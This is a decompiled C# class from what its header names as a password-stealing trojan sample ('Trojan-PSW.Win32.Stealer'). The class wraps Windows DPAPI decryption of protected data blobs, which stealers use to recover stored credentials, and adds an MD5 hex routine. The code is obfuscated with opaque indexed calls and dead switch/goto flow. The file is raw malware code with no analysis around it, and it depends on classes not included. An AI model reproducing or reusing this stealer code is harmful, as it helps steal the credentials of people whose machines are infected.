// Decompiled with JetBrains decompiler
// Type: CryptoHelper
// Assembly: Ajowans, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B9451E92-9872-44E9-A53B-32BF899B0E6F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.Win32.Stealer.gen-ca27c07cc9fddcd8bc07b2b9aa3406ab019fb54797bf2163b190217e9c17ce6a.exe

using Ajowans;
using System;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text;

public static class CryptoHelper
{
  public static string GetDecoded(
    string EncryptedData,
    DataProtectionScope dataProtectionScope,
    byte[] entropy = null)
  {
    Encoding pathList1 = ClientContext.RegisterFile();
    char[] pathList2 = new char[TemplateService.RegisterFile(1672)];
    // ISSUE: field reference
    DeviceManager.RegisterFile((Array) pathList2, __fieldref (VectorContext.previousHandler));
    byte[] generatorCache = PaneConverter.RegisterFile(PackageService.RegisterFile((object) XmlFileEditor.RegisterFile(TreeNodeType.RegisterFile(pathList2)), EncryptedData), dataProtectionScope, entropy);
    return MethodFactory.RegisterFile((object) pathList1, generatorCache);
  }

  public static byte[] DecryptBlob(
    byte[] EncryptedData,
    DataProtectionScope dataProtectionScope,
    byte[] entropy = null)
  {
    try
    {
      if (EncryptedData != null)
      {
label_1:
        switch (5)
        {
          case 0:
            goto label_1;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (CryptoHelper.DecryptBlob);
            }
            if (EncryptedData.Length != 0)
              return TextFileOptions.RegisterFile(EncryptedData, entropy, dataProtectionScope);
label_5:
            switch (1)
            {
              case 0:
                goto label_5;
            }
            break;
        }
      }
      return (byte[]) null;
    }
    catch (Exception ex)
    {
      return (byte[]) null;
    }
  }

  public static string GetMd5Hash(string source) => PartitionHelper.PrintDirectory((object) CryptoHelper.RegisterFile((IList<byte>) ActionProvider.RegisterFile((object) ControlOptions.RegisterFile(), PackageService.RegisterFile((object) XmlFileStack.RegisterFile(), source))), StreamProvider.RegisterFile(1928), string.Empty);

  private static string RegisterFile(IList<byte> pathList)
  {
    string pathList1 = string.Empty;
    for (int generatorCache1 = TemplateService.RegisterFile(1676); generatorCache1 < ContextType.RegisterFile((object) pathList); generatorCache1 += TemplateService.RegisterFile(1728))
    {
      int num = (int) EmulatorSettings.RegisterFile((object) pathList, generatorCache1);
      int pathList2 = num & TemplateService.RegisterFile(1680);
      int pathList3 = num >> TemplateService.RegisterFile(1684) & TemplateService.RegisterFile(1688);
      char pathList4;
      string pathList5;
      if (pathList3 > TemplateService.RegisterFile(1692))
      {
label_2:
        switch (6)
        {
          case 0:
            goto label_2;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (CryptoHelper.RegisterFile);
            }
            string pathList6 = pathList1;
            pathList4 = (char) (pathList3 - TemplateService.RegisterFile(1696) + TemplateService.RegisterFile(1700));
            string generatorCache2 = SolutionCollection.RegisterFile(ref pathList4, (IFormatProvider) ToolboxStream.RegisterFile());
            pathList5 = ConfigOptions.RegisterFile(pathList6, generatorCache2);
            break;
        }
      }
      else
        pathList5 = ConfigOptions.RegisterFile(pathList1, BitmapResolver.RegisterFile(ref pathList3, (IFormatProvider) ToolboxStream.RegisterFile()));
      if (pathList2 > TemplateService.RegisterFile(1704))
      {
label_8:
        switch (3)
        {
          case 0:
            goto label_8;
          default:
            string pathList7 = pathList5;
            pathList4 = (char) (pathList2 - TemplateService.RegisterFile(1708) + TemplateService.RegisterFile(1712));
            string generatorCache3 = SolutionCollection.RegisterFile(ref pathList4, (IFormatProvider) ToolboxStream.RegisterFile());
            pathList1 = ConfigOptions.RegisterFile(pathList7, generatorCache3);
            break;
        }
      }
      else
        pathList1 = ConfigOptions.RegisterFile(pathList5, BitmapResolver.RegisterFile(ref pathList2, (IFormatProvider) ToolboxStream.RegisterFile()));
      if (generatorCache1 + TemplateService.RegisterFile(1716) != ContextType.RegisterFile((object) pathList))
      {
label_12:
        switch (5)
        {
          case 0:
            goto label_12;
          default:
            if ((generatorCache1 + TemplateService.RegisterFile(1720)) % TemplateService.RegisterFile(1724) == 0)
            {
label_14:
              switch (2)
              {
                case 0:
                  goto label_14;
                default:
                  pathList1 = ConfigOptions.RegisterFile(pathList1, StreamProvider.RegisterFile(1928));
                  continue;
              }
            }
            else
              continue;
        }
      }
    }
label_18:
    switch (6)
    {
      case 0:
        goto label_18;
      default:
        return pathList1;
    }
  }
}
